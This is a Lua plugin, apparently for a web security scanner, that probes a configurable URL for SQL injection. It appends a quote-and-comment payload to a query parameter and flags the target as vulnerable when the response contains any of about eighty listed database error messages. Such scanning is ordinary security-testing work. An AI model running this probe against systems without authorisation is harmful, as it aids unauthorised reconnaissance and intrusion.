local http = require("http")
local client = http.client()

-- Metadata
METADATA = {
    AUTHOR = {"Author1 <author1@mail.com>"},
    VERSION = "0.1",
    TAGS = {"sqli","http","owasp"},
    INFO = [[Simple SQL Injection exploit.]]
}

-- Arguments/Variables needed to execute script
VARS = {
    URL = {VALUE="http://example.com", NEEDED="yes", DESCRIPT="URL to test."},
    PATH = {VALUE="/listproducts.php?cat=", NEEDED="No", DESCRIPT="Paths."},
    METHOD = {VALUE="GET", NEEDED="yes", DESCRIPT="Method"}
}


LIST={
"MySqlClient.",
"Server message",
"SQL error",
"Oracle error",
"JET Database Engine",
"Procedure or function",
"SQLite.Exception",
"[IBM][CLI Driver][DB2/6000]",
"the used select statements have different number of columns",
"org.postgresql.util.PSQLException",
"Access Database Engine",
"Incorrect syntax near",
"Syntax error in string in query expression",
"SQLiteException",
"' doesn't exist",
"CLI Driver",
"on MySQL result index",
"sybase",
"com.informix.jdbc",
"[MySQL][ODBC",
"has occurred in the vicinity of:",
"Sintaxis incorrecta cerca de",
"MySQL server version for the right syntax to use",
"com.mysql.jdbc.exceptions",
"You have an error in your SQL syntax near",
"You have an error in your SQL syntax;",
"An illegal character has been found in the statement",
"pg_query() [:",
"supplied argument is not a valid MySQL",
"mssql_query()",
"mysql_fetch_array()",
"java.sql.SQLException",
"Column count doesn't match value count at row",
"Sybase message",
"SQL Server",
"PostgreSQL query failed:",
"Dynamic SQL Error",
"System.Data.SQLite.SQLiteException",
"SQLite/JDBCDriver",
"Unclosed quotation mark before the character string",
"System.Data.SqlClient.",
"Unclosed quotation mark after the character string",
"System.Data.OleDb.OleDbException",
"[DM_QUERY_E_SYNTAX]",
"[SqlException",
"Unexpected end of command in statement",
"valid PostgreSQL result",
"pg_exec() [:",
"SQL Server",
"[SQLITE_ERROR]",
"Microsoft OLE DB Provider for ODBC Drivers",
"PostgreSQL",
"org.hsqldb.jdbc",
"ADODB.Field (0x800A0BCD)",
"SQL syntax",
"System.Data.SqlClient.SqlException",
"Data type mismatch in criteria expression.",
"Driver",
"DB2 SQL error",
"Sybase message:",
"ORA-",
"[Microsoft][ODBC SQL Server Driver]",
"'80040e14'",
"Microsoft OLE DB Provider for SQL Server",
"in query expression",
"Npgsql.",
"valid MySQL result",
"supplied argument is not a valid PostgreSQL result",
"db2_",
"Ingres SQLSTATE",
"Column count doesn't match",
"Warning",
"[Microsoft][ODBC Microsoft Access Driver]",
"[Macromedia][SQLServer JDBC Driver]",
"<b>Warning</b>: ibase_",
"Roadhouse.Cms.",
"DB2 SQL error:",
"SQLSTATE["
}


function Init()
    Meta(METADATA) -- Load metadata 
    LoadVars(VARS) -- Load variables
end

function Main()
  payload = "'\"#-"
  urli = VARS.URL.VALUE..VARS.PATH.VALUE..payload
  local request = http.request(VARS.METHOD.VALUE, urli)
  local r, err = client:do_request(request)
  local prob = 0

  for i=1,#LIST do
    if string.find(r.body,LIST[i]) then
      prob = prob+1
    end
  end

  if prob > 0 then
    print("Vulnerable")
  end
end
